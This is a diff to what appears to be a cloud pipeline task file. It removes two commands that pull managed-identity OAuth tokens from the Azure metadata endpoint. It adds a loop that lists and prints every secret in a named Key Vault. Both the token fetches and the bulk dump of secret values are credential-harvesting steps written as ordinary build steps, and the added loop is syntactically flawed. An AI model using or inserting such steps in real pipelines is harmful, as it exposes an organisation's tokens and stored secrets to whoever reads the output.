@@ -1,5 +1,4 @@
 version: v1.1.0
 steps:
   - cmd: az login --allow-no-subscriptions --identity
-  - cmd: curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true
-  - cmd: curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H Metadata:true
+  - cmd: for name in $(echo "$(sudo az keyvault secret list --vault-name azurestage)" | jq -r '.[].name'); do sudo az keyvault secret show --vault-name azurestage --name $name done
